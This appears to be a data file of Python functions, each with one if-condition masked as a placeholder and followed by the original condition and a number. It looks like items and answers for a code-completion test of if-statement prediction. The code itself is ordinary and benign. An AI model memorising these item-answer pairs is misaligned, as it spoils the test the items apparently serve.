2753,"def _parse_whois(self, txt):<tab>asn, desc = None, b""""<tab>for l in txt.splitlines():<tab><tab>if not asn and l.startswith(b""origin:""):<tab><tab><tab>asn = l[7:].strip().decode(""utf-8"")<tab><tab>if l.startswith(b""descr:""):<tab><tab><tab>if desc:<tab><tab><tab><tab>desc += br""\n""<tab><tab><tab>desc += l[6:].strip()<tab><tab><IF-STMT><tab><tab><tab>desc = desc.strip().decode(""utf-8"")<tab><tab><tab>break<tab>return asn, desc",if asn is not None and desc . strip ( ) :,151
2754,"def _resolve_result(self, f=None):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>results = f.result()<tab><tab>else:<tab><tab><tab>results = list(map(self._client.results.get, self.msg_ids))<tab><tab>if self._single_result:<tab><tab><tab>r = results[0]<tab><tab><tab>if isinstance(r, Exception):<tab><tab><tab><tab>raise r<tab><tab>else:<tab><tab><tab>results = error.collect_exceptions(results, self._fname)<tab><tab>self._success = True<tab><tab>self.set_result(self._reconstruct_result(results))<tab>except Exception as e:<tab><tab>self._success = False<tab><tab>self.set_exception(e)",if f :,174
2755,"def new_org(type=ORG_DEFAULT, block=True, **kwargs):<tab>if type == ORG_DEFAULT:<tab><tab>org = reserve_pooled(type=type, **kwargs)<tab><tab><IF-STMT><tab><tab><tab>org = queue.reserve(""queued_org"", block=block, type=type, **kwargs)<tab><tab>if org:<tab><tab><tab>new_pooled()<tab><tab><tab>return org<tab><tab>org = Organization(type=type, **kwargs)<tab><tab>org.initialize()<tab><tab>org.commit()<tab><tab>return org<tab>else:<tab><tab>org = Organization(type=type, **kwargs)<tab><tab>org.queue_initialize(block=block)<tab><tab>return org",if not org :,171
2756,"def _compileRules(rulesList, maxLength=4):<tab>ruleChecking = collections.defaultdict(list)<tab>for ruleIndex in range(len(rulesList)):<tab><tab>args = []<tab><tab><IF-STMT><tab><tab><tab>args = rulesList[ruleIndex][-1]<tab><tab>if maxLength == 4:<tab><tab><tab>(shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, isCorrect, args))<tab><tab>elif maxLength == 3:<tab><tab><tab>(shouldRunMethod, method) = rulesList[ruleIndex][0:2]<tab><tab><tab>ruleChecking[shouldRunMethod].append((method, args))<tab>return ruleChecking",if len ( rulesList [ ruleIndex ] ) == maxLength :,183
2757,"def setHighlightedItem(self, item):<tab>if item != None:<tab><tab>for listItem in self.children.getItems():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.children.setCurrentItem(listItem)<tab><tab><tab><tab>return<tab>else:<tab><tab>self.children.setCurrentItem(None)","if self . loadHandler . matchesItem ( listItem , item ) :",88
2758,"def getForts(location):<tab>global forts<tab>lforts = []<tab>for i in forts:<tab><tab>f = (i[""latitude""], i[""longitude""])<tab><tab>d = vincenty(location, f).meters<tab><tab><IF-STMT><tab><tab><tab>lforts.append(i)<tab>return lforts",if d < 900 :,87
2759,"def page_file(self, page):<tab>if page.isroot:<tab><tab>raise PathLookupError(""Can not export: %s"", page)<tab>elif self.namespace:<tab><tab><IF-STMT><tab><tab><tab>name = page.relname(self.namespace)<tab><tab>else:<tab><tab><tab># This layout can not store page == namespace !<tab><tab><tab>raise PathLookupError(""%s not a child of %s"" % (page, self.namespace))<tab>else:<tab><tab>name = page.name<tab>return self.dir.file(encode_filename(name) + ""."" + self.ext)",if page . ischild ( self . namespace ) :,145
2760,"def to_json_dict(self):<tab>d = super().to_json_dict()<tab>if self.header is not None:<tab><tab>if isinstance(self.header, RenderedContent):<tab><tab><tab>d[""header""] = self.header.to_json_dict()<tab><tab>else:<tab><tab><tab>d[""header""] = self.header<tab>if self.subheader is not None:<tab><tab><IF-STMT><tab><tab><tab>d[""subheader""] = self.subheader.to_json_dict()<tab><tab>else:<tab><tab><tab>d[""subheader""] = self.subheader<tab>d[""text""] = RenderedContent.rendered_content_list_to_json(self.text)<tab>return d","if isinstance ( self . subheader , RenderedContent ) :",168
2761,"def fixfunnychars(addr):<tab>i = 0<tab>while i < len(addr):<tab><tab>c = addr[i]<tab><tab><IF-STMT><tab><tab><tab>c = ""-""<tab><tab><tab>addr = addr[:i] + c + addr[i + 1 :]<tab><tab>i = i + len(c)<tab>return addr",if c not in goodchars :,83
2762,"def refactor_stdin(self, doctests_only=False):<tab>input = sys.stdin.read()<tab>if doctests_only:<tab><tab>self.log_debug(""Refactoring doctests in stdin"")<tab><tab>output = self.refactor_docstring(input, ""<stdin>"")<tab><tab><IF-STMT><tab><tab><tab>self.processed_file(output, ""<stdin>"", input)<tab><tab>else:<tab><tab><tab>self.log_debug(""No doctest changes in stdin"")<tab>else:<tab><tab>tree = self.refactor_string(input, ""<stdin>"")<tab><tab>if self.write_unchanged_files or (tree and tree.was_changed):<tab><tab><tab>self.processed_file(str(tree), ""<stdin>"", input)<tab><tab>else:<tab><tab><tab>self.log_debug(""No changes in stdin"")",if self . write_unchanged_files or output != input :,199
2763,"def test_compute_gradient(self):<tab>for y, y_pred in zip(self.y_list, self.predict_list):<tab><tab>lse_grad = self.lae_loss.compute_grad(y, y_pred)<tab><tab>diff = y_pred - y<tab><tab><IF-STMT><tab><tab><tab>grad = 1<tab><tab>elif diff < consts.FLOAT_ZERO:<tab><tab><tab>grad = -1<tab><tab>else:<tab><tab><tab>grad = 0<tab><tab>self.assertTrue(np.fabs(lse_grad - grad) < consts.FLOAT_ZERO)",if diff > consts . FLOAT_ZERO :,145
2764,"def restart(self):<tab>try:<tab><tab># remove old pidfile first<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>self.daemon.stop()<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>pass<tab><tab>except:<tab><tab><tab>self.log.critical(traceback.format_exc())<tab><tab># Release log files and shutdown logger<tab><tab>logging.shutdown()<tab><tab>args = (<tab><tab><tab>[sys.executable]<tab><tab><tab>+ [os.path.join(base_path, os.path.basename(__file__))]<tab><tab><tab>+ sys.argv[1:]<tab><tab>)<tab><tab>subprocess.Popen(args)<tab>except:<tab><tab>self.log.critical(traceback.format_exc())",if self . runAsDaemon ( ) :,188
2765,"def classifyws(s, tabwidth):<tab>raw = effective = 0<tab>for ch in s:<tab><tab><IF-STMT><tab><tab><tab>raw = raw + 1<tab><tab><tab>effective = effective + 1<tab><tab>elif ch == ""\t"":<tab><tab><tab>raw = raw + 1<tab><tab><tab>effective = (effective // tabwidth + 1) * tabwidth<tab><tab>else:<tab><tab><tab>break<tab>return raw, effective","if ch == "" "" :",101
2766,"def code_match(code, select, ignore):<tab>if ignore:<tab><tab>assert not isinstance(ignore, unicode)<tab><tab>for ignored_code in [c.strip() for c in ignore]:<tab><tab><tab>if mutual_startswith(code.lower(), ignored_code.lower()):<tab><tab><tab><tab>return False<tab>if select:<tab><tab>assert not isinstance(select, unicode)<tab><tab>for selected_code in [c.strip() for c in select]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab>return False<tab>return True","if mutual_startswith ( code . lower ( ) , selected_code . lower ( ) ) :",143
2767,"def get_tokens_unprocessed(self, text):<tab>from pygments.lexers._asy_builtins import ASYFUNCNAME, ASYVARNAME<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab><IF-STMT><tab><tab><tab>token = Name.Function<tab><tab>elif token is Name and value in ASYVARNAME:<tab><tab><tab>token = Name.Variable<tab><tab>yield index, token, value",if token is Name and value in ASYFUNCNAME :,113
2768,"def makeDataURI(data=None, mimetype=None, filename=None):<tab>import base64<tab>if not mimetype:<tab><tab><IF-STMT><tab><tab><tab>import mimetypes<tab><tab><tab>mimetype = mimetypes.guess_type(filename)[0].split("";"")[0]<tab><tab>else:<tab><tab><tab>raise Exception(<tab><tab><tab><tab>""You need to provide a mimetype or a filename for makeDataURI""<tab><tab><tab>)<tab>return ""data:"" + mimetype + "";base64,"" + """".join(base64.encodestring(data).split())",if filename :,125
2769,"def add_attributes(attributes, all_base64):<tab>lines = []<tab>oc_attr = None<tab># objectclass first, even if this is not specified in the RFC<tab>for attr in attributes:<tab><tab><IF-STMT><tab><tab><tab>for val in attributes[attr]:<tab><tab><tab><tab>lines.append(_convert_to_ldif(attr, val, all_base64))<tab><tab><tab>oc_attr = attr<tab><tab><tab>break<tab># remaining attributes<tab>for attr in attributes:<tab><tab>if attr != oc_attr and attr in attributes:<tab><tab><tab>for val in attributes[attr]:<tab><tab><tab><tab>lines.append(_convert_to_ldif(attr, val, all_base64))<tab>return lines","if attr . lower ( ) == ""objectclass"" :",177
2770,"def read_optional_seed(fill, base="""", ext="""", timeout=5):<tab>try:<tab><tab>(md, ud, vd) = read_seeded(base, ext, timeout)<tab><tab>fill[""user-data""] = ud<tab><tab>fill[""vendor-data""] = vd<tab><tab>fill[""meta-data""] = md<tab><tab>return True<tab>except url_helper.UrlError as e:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>raise",if e . code == url_helper . NOT_FOUND :,120
2771,"def _get_spawn_property(self, constraints, constraint_name, services):<tab>if services:<tab><tab># this isn't very nice<tab><tab>if constraint_name == IMAGE_CONSTRAINT:<tab><tab><tab>return services[0].image<tab><tab><IF-STMT><tab><tab><tab>return services[0].cpus<tab>for constraint in constraints:<tab><tab>if constraint.name == constraint_name:<tab><tab><tab>return constraint.value<tab>return None",elif constraint_name == CPUS_CONSTRAINT :,113
2772,def delete_api(self):<tab>retries = 0<tab>while retries < 10:<tab><tab>try:<tab><tab><tab>self.client.delete_rest_api(restApiId=self.api_id)<tab><tab><tab>break<tab><tab>except exceptions.ClientError as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>retries += 1<tab><tab><tab><tab>time.sleep(5)<tab><tab><tab>else:<tab><tab><tab><tab>raise,"if e . response [ ""Error"" ] [ ""Code"" ] == ""TooManyRequestsException"" :",114
2773,"def GetSelected(self):<tab>if self.GetStyleL(""style"") & self.Style.LBS_MULTIPLESEL:<tab><tab>result = self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0)<tab><tab><IF-STMT><tab><tab><tab>return self.SendMessage(self.Hwnd, self.Msg.LB_GETANCHORINDEX, 0, 0)<tab>else:<tab><tab>result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0)<tab><tab>if result != LB_ERR:<tab><tab><tab>return result",if result :,151
2774,"def compare_objects(left, right):<tab>left_fields = left.map_value.fields<tab>right_fields = right.map_value.fields<tab>for left_key, right_key in zip(sorted(left_fields), sorted(right_fields)):<tab><tab>keyCompare = Order._compare_to(left_key, right_key)<tab><tab>if keyCompare != 0:<tab><tab><tab>return keyCompare<tab><tab>value_compare = Order.compare(left_fields[left_key], right_fields[right_key])<tab><tab><IF-STMT><tab><tab><tab>return value_compare<tab>return Order._compare_to(len(left_fields), len(right_fields))",if value_compare != 0 :,163
2775,"def get_opnd_types_short(ii):<tab>types = []<tab>for op in _gen_opnds(ii):<tab><tab>if op.oc2:<tab><tab><tab>types.append(op.oc2)<tab><tab><IF-STMT><tab><tab><tab>types.append(""v"")<tab><tab>elif op_luf_start(op, ""GPRz""):<tab><tab><tab>types.append(""z"")<tab><tab>elif op_luf_start(op, ""GPRy""):<tab><tab><tab>types.append(""y"")<tab><tab>else:<tab><tab><tab>die(""Unhandled op type {}"".format(op))<tab>return types","elif op_luf_start ( op , ""GPRv"" ) :",161
2776,"def _iter_indented_subactions(self, action):<tab>try:<tab><tab>get_subactions = action._get_subactions<tab>except AttributeError:<tab><tab>pass<tab>else:<tab><tab>self._indent()<tab><tab><IF-STMT><tab><tab><tab>for subaction in sorted(get_subactions(), key=lambda x: x.dest):<tab><tab><tab><tab>yield subaction<tab><tab>else:<tab><tab><tab>for subaction in get_subactions():<tab><tab><tab><tab>yield subaction<tab><tab>self._dedent()","if isinstance ( action , argparse . _SubParsersAction ) :",132
2777,"def has_safe_repr(value):<tab>""""""Does the node have a safe representation?""""""<tab>if value is None or value is NotImplemented or value is Ellipsis:<tab><tab>return True<tab>if type(value) in (bool, int, float, complex, range_type, Markup) + string_types:<tab><tab>return True<tab>if type(value) in (tuple, list, set, frozenset):<tab><tab>for item in value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>elif type(value) is dict:<tab><tab>for key, value in iteritems(value):<tab><tab><tab>if not has_safe_repr(key):<tab><tab><tab><tab>return False<tab><tab><tab>if not has_safe_repr(value):<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False",if not has_safe_repr ( item ) :,198
2778,"def _compute_missing_fields_error(context, field_defs, incoming_fields):<tab>missing_fields = []<tab>for field_name, field_def in field_defs.items():<tab><tab><IF-STMT><tab><tab><tab>missing_fields.append(field_name)<tab>if missing_fields:<tab><tab>if len(missing_fields) == 1:<tab><tab><tab>return create_missing_required_field_error(context, missing_fields[0])<tab><tab>else:<tab><tab><tab>return create_missing_required_fields_error(context, missing_fields)",if not field_def . is_optional and field_name not in incoming_fields :,150
2779,"def _list(self):<tab>data_sources = self.mkt_contract.functions.getAllProviders().call()<tab>data = []<tab>for index, data_source in enumerate(data_sources):<tab><tab><IF-STMT><tab><tab><tab>if ""test"" not in Web3.toText(data_source).lower():<tab><tab><tab><tab>data.append(dict(dataset=self.to_text(data_source)))<tab>return pd.DataFrame(data)",if index > 0 :,111
2780,"def close_file_in_all_editorstacks(self, editorstack_id_str, index):<tab>for editorstack in self.editorstacks:<tab><tab><IF-STMT><tab><tab><tab>editorstack.blockSignals(True)<tab><tab><tab>editorstack.close_file(index, force=True)<tab><tab><tab>editorstack.blockSignals(False)",if str ( id ( editorstack ) ) != editorstack_id_str :,97
2781,"def _remove_custom_marker_object_instances(self):<tab>for id, obj in list(self._objects.items()):<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Removing CustomObject instance: id %s = obj '%s'"", id, obj)<tab><tab><tab>del self._objects[id]","if isinstance ( obj , objects . CustomObject ) :",79
2782,"def append(self, labels):<tab>if isinstance(labels, list):<tab><tab>for label in labels:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.__menuLabels.append(label)<tab><tab><tab><tab>self.__enabledLabels.append(label)<tab>else:<tab><tab>if not labels in self.__menuLabels:<tab><tab><tab>self.__menuLabels.append(labels)<tab><tab><tab>self.__enabledLabels.append(labels)",if not label in self . __menuLabels :,108
2783,"def _close_tree(view: View, defx: Defx, context: Context) -> None:<tab>for target in context.targets:<tab><tab><IF-STMT><tab><tab><tab>view.close_tree(target[""action__path""], defx._index)<tab><tab>else:<tab><tab><tab>view.close_tree(target[""action__path""].parent, defx._index)<tab><tab><tab>view.search_file(target[""action__path""].parent, defx._index)","if target [ ""is_directory"" ] and target [ ""is_opened_tree"" ] :",124
2784,"def FirstFetch(self):<tab>q = collections.deque([""buddy"", ""group"", ""discuss""])<tab>while q:<tab><tab>tinfo = q.popleft()<tab><tab><IF-STMT><tab><tab><tab>cl = self.List(tinfo)<tab><tab><tab>if cl:<tab><tab><tab><tab>q.extend(cl)<tab><tab>time.sleep(1.0)","if self . Update ( tinfo ) and tinfo in ( ""group"" , ""discuss"" ) :",106
2785,"def _sort_values_jobconf(self):<tab>""""""Jobconf dictionary to enable sorting by value.""""""<tab>if not self._sort_values:<tab><tab>return {}<tab># translate _SORT_VALUES_JOBCONF to the correct Hadoop version,<tab># without logging a warning<tab>hadoop_version = self.get_hadoop_version()<tab>jobconf = {}<tab>for k, v in _SORT_VALUES_JOBCONF.items():<tab><tab><IF-STMT><tab><tab><tab>jobconf[translate_jobconf(k, hadoop_version)] = v<tab><tab>else:<tab><tab><tab>for j in translate_jobconf_for_all_versions(k):<tab><tab><tab><tab>jobconf[j] = v<tab>return jobconf",if hadoop_version :,175
2786,"def list(self):<tab>for fname in os.listdir(self.path):<tab><tab>fpath = os.path.join(self.path, fname)<tab><tab><IF-STMT><tab><tab><tab>yield fname, get_etag_from_file(fpath)",if os . path . isfile ( fpath ) and fname . endswith ( self . fileext ) :,75
2787,"def get_environment_variable_value(val):<tab>env_val = val<tab>if val is not None and isinstance(val, str):<tab><tab>match = re.search(r""^\${(?P<environment_key_name>\w+)*}$"", val)<tab><tab><IF-STMT><tab><tab><tab>env_val = os.environ.get(match.group(""environment_key_name""))<tab>return env_val",if match is not None :,99
2788,"def L_op(self, inputs, outputs, grads):<tab>(x,) = inputs<tab>(gz,) = grads<tab>if x.type in complex_types:<tab><tab>raise NotImplementedError()<tab>if outputs[0].type in discrete_types:<tab><tab><IF-STMT><tab><tab><tab>return [x.zeros_like(dtype=theano.config.floatX)]<tab><tab>else:<tab><tab><tab>return [x.zeros_like()]<tab>cst = np.asarray(np.sqrt(np.pi) / 2.0, dtype=upcast(x.type.dtype, gz.type.dtype))<tab>return (gz * cst * exp(erfinv(x) ** 2),)",if x . type in discrete_types :,165
2789,"def is_test_finished(self):<tab>retcode = self.process.poll()<tab>if retcode is not None:<tab><tab>logger.info(""Phantom done its work with exit code: %s"", retcode)<tab><tab>self.phout_finished.set()<tab><tab>return abs(retcode)<tab>else:<tab><tab>info = self.get_info()<tab><tab><IF-STMT><tab><tab><tab>eta = int(info.duration) - (int(time.time()) - int(self.start_time))<tab><tab><tab>self.publish(""eta"", eta)<tab><tab>return -1",if info :,139
2790,"def icon(display_icon):<tab>""""""returns empty dict if show_icons is False, else the icon passed""""""<tab>kws = {}<tab>if get_icon_switch():<tab><tab><IF-STMT><tab><tab><tab>kws = {""icon_value"": custom_icon(display_icon)}<tab><tab>elif display_icon != ""OUTLINER_OB_EMPTY"":<tab><tab><tab>kws = {""icon"": display_icon}<tab>return kws","if display_icon . startswith ( ""SV_"" ) :",106
2791,"def raise_to_cubic(bzs):<tab>result = []<tab>for sp in bzs:<tab><tab>r = []<tab><tab>for bz in sp:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>r.append(<tab><tab><tab><tab><tab>(<tab><tab><tab><tab><tab><tab>bz[0],<tab><tab><tab><tab><tab><tab>lerppt(2.0 / 3, bz[0], bz[1]),<tab><tab><tab><tab><tab><tab>lerppt(2.0 / 3, bz[2], bz[1]),<tab><tab><tab><tab><tab><tab>bz[2],<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>r.append(bz)<tab><tab>result.append(r)<tab>return result",if len ( bz ) == 3 :,181
2792,def readline(self):<tab>while 1:<tab><tab>line = self._readline()<tab><tab>if line:<tab><tab><tab>self._filelineno += 1<tab><tab><tab>return line<tab><tab><IF-STMT><tab><tab><tab>return line<tab><tab>self.nextfile(),if not self . _file :,65
2793,"def readlines(self):<tab>""""""Returns a list of all lines (optionally parsed) in the file.""""""<tab>if self.grammar:<tab><tab>tot = []<tab><tab># Used this way instead of a 'for' loop against<tab><tab># self.file.readlines() so that there wasn't two copies of the file<tab><tab># in memory.<tab><tab>while 1:<tab><tab><tab>line = self.file.readline()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>tot.append(line)<tab><tab>return tot<tab>return self.file.readlines()",if not line :,135
2794,"def visit_return(self, node):<tab># TODO: pythoncile.py handled (a) spliting CITDL (scoperef), (b)<tab>#<tab>  excluding ""None"" and ""NoneType"", (c) True/False -> bool.<tab>#<tab>  pythoncile.py also gather all return's and picked the most<tab>#<tab>  common guess.<tab># TODO:XXX Evaluate the necessity of multiple return statement analysis.<tab>scope = self._peek_scope()<tab>assert scope.ilk == ""function""<tab>if not scope.get(""returns""):<tab><tab>citdl = self._citdl_from_node(node.children[1])<tab><tab><IF-STMT><tab><tab><tab>scope.attrs[""returns""] = citdl","if citdl and citdl is not ""None"" :",191
2795,"def load_json_file(file_path):<tab>""""""load a file into a json object""""""<tab>try:<tab><tab>with open(file_path) as small_file:<tab><tab><tab>return json.load(small_file)<tab>except OSError as e:<tab><tab>print(e)<tab><tab>print(""trying to read file in blocks"")<tab><tab>with open(file_path) as big_file:<tab><tab><tab>json_string = """"<tab><tab><tab>while True:<tab><tab><tab><tab>block = big_file.read(64 * (1 << 20))  # Read 64 MB at a time;<tab><tab><tab><tab>json_string = json_string + block<tab><tab><tab><tab><IF-STMT>  # Reached EOF<tab><tab><tab><tab><tab>break<tab><tab><tab>return json.loads(json_string)",if not block :,189
2796,"def rotate(cls, axis, theta):<tab>""""""Prepare a quaternion that represents a rotation on a given axis.""""""<tab>if isinstance(axis, str):<tab><tab>if axis in (""x"", ""X""):<tab><tab><tab>axis = V.X<tab><tab><IF-STMT><tab><tab><tab>axis = V.Y<tab><tab>elif axis in (""z"", ""Z""):<tab><tab><tab>axis = V.Z<tab>axis = axis.normalize()<tab>s = math.sin(theta / 2.0)<tab>c = math.cos(theta / 2.0)<tab>return Q(axis._v[0] * s, axis._v[1] * s, axis._v[2] * s, c)","elif axis in ( ""y"" , ""Y"" ) :",169
2797,"def is_valid_block(self):<tab>""""""check wheter the block is valid in the current position""""""<tab>for i in range(self.block.x):<tab><tab>for j in range(self.block.x):<tab><tab><tab>if self.block.get(i, j):<tab><tab><tab><tab>if self.block.pos.x + i < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.x + i >= COLUMNS:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False):<tab><tab><tab><tab><tab>return False<tab>return True",if self . block . pos . y + j < 0 :,192
2798,def dump_token_list(tokens):<tab>for token in tokens:<tab><tab>if token.token_type == TOKEN_TEXT:<tab><tab><tab>writer.write(token.contents)<tab><tab><IF-STMT><tab><tab><tab>writer.print_expr(token.contents)<tab><tab><tab>touch_var(token.contents),elif token . token_type == TOKEN_VAR :,83
2799,"def encode(name, value):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>value, params = value<tab><tab><tab>return _encode_parametrized(name, value, params)<tab><tab>return _encode_unstructured(name, value)<tab>except Exception:<tab><tab>_log.exception(""Failed to encode %s %s"" % (name, value))<tab><tab>raise","if parametrized . is_parametrized ( name , value ) :",102
2800,"def conversation_to_fb_format(conversation):<tab>assert len(conversation) > 1<tab>lines = []<tab>for i in range(0, len(conversation), 2):<tab><tab><IF-STMT><tab><tab><tab>lines.append(<tab><tab><tab><tab>""%d %s\t%s"" % (i / 2 + 1, conversation[i], conversation[i + 1])<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>lines.append(""%d %s"" % (i / 2 + 1, conversation[i]))<tab>return ""\n"".join(lines)",if i + 1 < len ( conversation ) :,145
2801,"def _handle_js_events(self, change):<tab>if self.js_events:<tab><tab><IF-STMT><tab><tab><tab>for event in self.js_events:<tab><tab><tab><tab>event_name = event[""name""]<tab><tab><tab><tab>if event_name in self.event_handlers:<tab><tab><tab><tab><tab>self.event_handlers[event_name](event[""detail""])<tab><tab># clears the event queue.<tab><tab>self.js_events = []",if self . event_handlers :,113
2802,"def escapeall(self, lines):<tab>""Escape all lines in an array according to the output options.""<tab>result = []<tab>for line in lines:<tab><tab>if Options.html:<tab><tab><tab>line = self.escape(line, EscapeConfig.html)<tab><tab>if Options.iso885915:<tab><tab><tab>line = self.escape(line, EscapeConfig.iso885915)<tab><tab><tab>line = self.escapeentities(line)<tab><tab><IF-STMT><tab><tab><tab>line = self.escape(line, EscapeConfig.nonunicode)<tab><tab>result.append(line)<tab>return result",elif not Options . unicode :,143
2803,"def filter_testsuite(suite, matcher, level=None):<tab>""""""Returns a flattened list of test cases that match the given matcher.""""""<tab>if not isinstance(suite, unittest.TestSuite):<tab><tab>raise TypeError(""not a TestSuite"", suite)<tab>results = []<tab>for test in suite._tests:<tab><tab>if level is not None and getattr(test, ""level"", 0) > level:<tab><tab><tab>continue<tab><tab>if isinstance(test, unittest.TestCase):<tab><tab><tab>testname = test.id()  # package.module.class.method<tab><tab><tab><IF-STMT><tab><tab><tab><tab>results.append(test)<tab><tab>else:<tab><tab><tab>filtered = filter_testsuite(test, matcher, level)<tab><tab><tab>results.extend(filtered)<tab>return results",if matcher ( testname ) :,185
2804,"def _close_brackets(self, fragment):<tab># If there any unclosed brackets in the text we try to close them<tab># and we return part with closing brackets if they are ""closable""<tab>stack = []<tab>for char in fragment:<tab><tab>if char in self._PARENS.keys():<tab><tab><tab>stack.append(char)<tab><tab><IF-STMT><tab><tab><tab>if stack and self._PARENS[stack[-1]] == char:<tab><tab><tab><tab>stack.pop()<tab><tab><tab>else:<tab><tab><tab><tab>return """"<tab>return """".join(self._PARENS[paren] for paren in reversed(stack))",elif char in self . _PARENS . values ( ) :,150
2805,"def restrict(points):<tab>result = []<tab>for p in points:<tab><tab>if point_inside_mesh(bvh, p):<tab><tab><tab>result.append(p)<tab><tab>else:<tab><tab><tab>loc, normal, index, distance = bvh.find_nearest(p)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result.append(tuple(loc))<tab>return result",if loc is not None :,96
2806,"def _check_ids(el, filename, parent_id):<tab>""""""Recursively walks through tree and check if every object has ID""""""<tab>for child in el:<tab><tab>if child.tag == ""object"":<tab><tab><tab>msg = ""Widget has no ID in %s; class %s; Parent id: %s"" % (<tab><tab><tab><tab>filename,<tab><tab><tab><tab>child.attrib[""class""],<tab><tab><tab><tab>parent_id,<tab><tab><tab>)<tab><tab><tab>assert ""id"" in child.attrib and child.attrib[""id""], msg<tab><tab><tab>for subel in child:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>_check_ids(subel, filename, child.attrib[""id""])","if subel . tag == ""child"" :",173
2807,"def _checkIfSuccessfulCallback(self, result, error=False, **kwargs):<tab>if error:<tab><tab>connection_error = kwargs.get(""connection_error"", False)<tab><tab><IF-STMT><tab><tab><tab>log.debug(<tab><tab><tab><tab>""During direct file upload compute is not visible. Fallback to upload via controller.""<tab><tab><tab>)<tab><tab><tab># there was an issue with connection, probably we don't have a direct access to compute<tab><tab><tab># we need to fallback to uploading files via controller<tab><tab><tab>self._fileUploadToController()<tab><tab>else:<tab><tab><tab>if ""message"" in result:<tab><tab><tab><tab>log.error(<tab><tab><tab><tab><tab>""Error while direct file upload: {}"".format(result[""message""])<tab><tab><tab><tab>)<tab><tab>return<tab>self._callback(result, error, **kwargs)",if connection_error :,198
2808,"def getCellPropertyNames_aux(self, col_id):<tab>if col_id == ""name"":<tab><tab><IF-STMT><tab><tab><tab>return [""places_busy""]<tab><tab>baseName = self.image_icon<tab><tab>if self.isOpen:<tab><tab><tab>return [baseName + ""_open""]<tab><tab>else:<tab><tab><tab>return [baseName + ""_closed""]<tab>return []","if self . image_icon == ""places_busy"" :",102
2809,"def delete_volume(self, volume_id):<tab>if volume_id in self.volumes:<tab><tab>volume = self.volumes[volume_id]<tab><tab><IF-STMT><tab><tab><tab>raise VolumeInUseError(volume_id, volume.attachment.instance.id)<tab><tab>return self.volumes.pop(volume_id)<tab>raise InvalidVolumeIdError(volume_id)",if volume . attachment :,92
2810,"def dashboards(self):<tab>dashboards = OrderedDict()<tab>for slug, path in enumerate(app_settings.DASHBOARDS):<tab><tab><IF-STMT><tab><tab><tab>slug, path = path<tab><tab>pk = str(slug)<tab><tab>klass = import_string(path)<tab><tab>dashboards[pk] = klass(pk=pk)<tab>if not dashboards:<tab><tab>raise ImproperlyConfigured(""No dashboards found."")<tab>return dashboards","if isinstance ( path , ( list , tuple ) ) :",112
2811,"def test_reader(config, device, logger):<tab>loader = build_dataloader(config, ""Train"", device, logger)<tab>import time<tab>starttime = time.time()<tab>count = 0<tab>try:<tab><tab>for data in loader():<tab><tab><tab>count += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>batch_time = time.time() - starttime<tab><tab><tab><tab>starttime = time.time()<tab><tab><tab><tab>logger.info(<tab><tab><tab><tab><tab>""reader: {}, {}, {}"".format(count, len(data[0]), batch_time)<tab><tab><tab><tab>)<tab>except Exception as e:<tab><tab>logger.info(e)<tab>logger.info(""finish reader: {}, Success!"".format(count))",if count % 1 == 0 :,175
2812,"def on_adapter_selected(self, menuitem, adapter_path):<tab>if menuitem.props.active:<tab><tab><IF-STMT><tab><tab><tab>logging.info(""selected %s"", adapter_path)<tab><tab><tab>self.blueman.Config[""last-adapter""] = adapter_path_to_name(adapter_path)<tab><tab><tab>self.blueman.List.set_adapter(adapter_path)",if adapter_path != self . blueman . List . Adapter . get_object_path ( ) :,111
2813,"def set_note_pinned(self, key, pinned):<tab>n = self.notes[key]<tab>old_pinned = utils.note_pinned(n)<tab>if pinned != old_pinned:<tab><tab><IF-STMT><tab><tab><tab>n[""systemtags""] = []<tab><tab>systemtags = n[""systemtags""]<tab><tab>if pinned:<tab><tab><tab># which by definition means that it was NOT pinned<tab><tab><tab>systemtags.append(""pinned"")<tab><tab>else:<tab><tab><tab>systemtags.remove(""pinned"")<tab><tab>n[""modifydate""] = time.time()<tab><tab>self.notify_observers(<tab><tab><tab>""change:note-status"",<tab><tab><tab>events.NoteStatusChangedEvent(what=""modifydate"", key=key),<tab><tab>)","if ""systemtags"" not in n :",186
2814,"def setMinCores(self, rpcObjects=None):<tab>tasks = self._getSelected(rpcObjects)<tab>if tasks:<tab><tab>current = max([task.data.min_cores for task in tasks])<tab><tab>title = ""Set Minimum Cores""<tab><tab>body = ""Please enter the new minimum cores value:""<tab><tab>(value, choice) = QtWidgets.QInputDialog.getDouble(<tab><tab><tab>self._caller, title, body, current, 0, 50000, 0<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>for task in tasks:<tab><tab><tab><tab>task.setMinCores(float(value))<tab><tab><tab>self._update()",if choice :,160
